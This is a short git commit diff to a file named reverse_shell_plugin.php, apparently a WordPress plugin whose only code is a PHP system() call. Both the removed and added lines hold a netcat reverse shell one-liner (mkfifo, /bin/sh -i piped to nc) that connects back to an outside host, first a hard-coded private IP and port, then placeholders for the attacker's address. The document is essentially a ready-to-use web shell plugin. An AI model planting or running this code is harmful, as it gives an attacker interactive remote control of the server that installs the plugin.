14863d6f0a57189b9f52e72acac589fe98ac77df
Onur Bayırlı <67410757+onurbyrl@users.noreply.github.com>
2021-09-22 00:12:23 +0300

    Update reverse_shell_plugin.php

--- reverse_shell_plugin.php
+++ reverse_shell_plugin.php
@@ -9,6 +9,6 @@
 * Author URI: /
 */
 
-system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.29 4444 >/tmp/f");
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker IP> <listening port> >/tmp/f");
 ?>
 
